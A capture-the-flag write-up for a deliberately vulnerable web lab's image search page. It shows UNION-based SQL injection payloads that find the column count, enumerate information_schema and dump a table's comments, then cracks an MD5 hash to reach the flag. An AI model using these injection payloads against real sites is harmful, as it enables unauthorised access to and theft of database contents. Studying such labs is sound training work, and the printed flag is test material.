# searchimg

We go to `/?page=searchimg`. We see an input that allows us to search for an image by its id.

We try a few different numbers. `5` yields something interesting :

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

This looks like a classic SQL injection. We try the following exploit :

```
5 UNION SELECT 1
```

We get nothing. This is normal : we need to figure out how many columns are returned by the section left of `UNION`.

We do this by adding to the `SELECT` : we try `SELECT 1`, `SELECT 1,2`, `SELECT 1,2,3`...

`SELECT 1,2` seems to work ; now we can start replacing the numbers with useful queries.

We try the following :

```
5 UNION SELECT table_name, column_name FROM information_schema.columns
```

We look for anything related to `image` ; we find information on the `list_images` table :

```
ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: id
Url : list_images

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: url
Url : list_images

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: title
Url : list_images

ID: 5 UNION SELECT table_name, column_name FROM information_schema.columns 
Title: comment
Url : list_images
```

This tells us there's a `list_images` table, with the following fields :

- id
- url
- title
- comment

We take a look at those last two using :

```
5 UNION SELECT comment, title FROM list_images
```

The last image listed reads :

```
ID: 5 UNION SELECT comment, title FROM list_images 
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

We decrypt the MD5 over at [MD5decrypt](https://md5decrypt.net/). We get :

```
albatroz
```

Following the instructions, we encrypt it with SHA256 and get :

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```